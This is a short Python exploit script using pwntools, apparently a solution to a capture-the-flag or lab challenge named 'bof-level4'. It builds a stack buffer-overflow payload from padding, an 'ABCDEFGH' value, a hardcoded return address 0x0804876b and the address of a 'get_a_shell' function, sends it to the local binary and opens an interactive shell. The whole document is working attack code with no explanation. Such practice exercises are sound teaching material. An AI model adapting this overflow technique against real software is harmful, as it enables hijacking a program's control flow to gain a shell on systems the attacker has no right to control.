from pwn import *

# Set up attack
p = process("./bof-level4")
e = ELF("./bof-level4")
prog_input = (20 * '1') + ('ABCDEFGH') + (8 * '1') + p32(0x0804876b) + ('1' * 12) + (p32(e.symbols['get_a_shell']))

# Initiate attack
print(p.recv(0x200))
p.sendline(prog_input)
p.interactive()
